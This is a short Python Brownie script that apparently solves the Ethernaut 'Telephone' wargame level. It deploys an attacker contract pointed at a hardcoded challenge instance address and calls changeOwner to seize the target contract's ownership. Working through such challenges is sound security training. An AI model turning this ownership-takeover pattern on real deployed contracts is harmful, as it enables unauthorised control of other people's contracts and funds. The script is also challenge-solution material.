from scripts.helpful_scripts import get_account
from brownie import AttackTelephone, network
from web3 import Web3


def deploy_AttackTelephone(Telephone_address):
    account = get_account()
    telephone_attack = AttackTelephone.deploy(
        Telephone_address,
        {"from": account},
    )
    return telephone_attack


def main():
    print(network.show_active())
    account = get_account()
    telephone_attack = deploy_AttackTelephone(
        "0x4C4600a0f6fE4b04729FF86fb1150c0048cdD1CD"  # Ethernaut Telephone instance
    )

    print(telephone_attack)

    telephone_attack.changeOwner({"from": account})
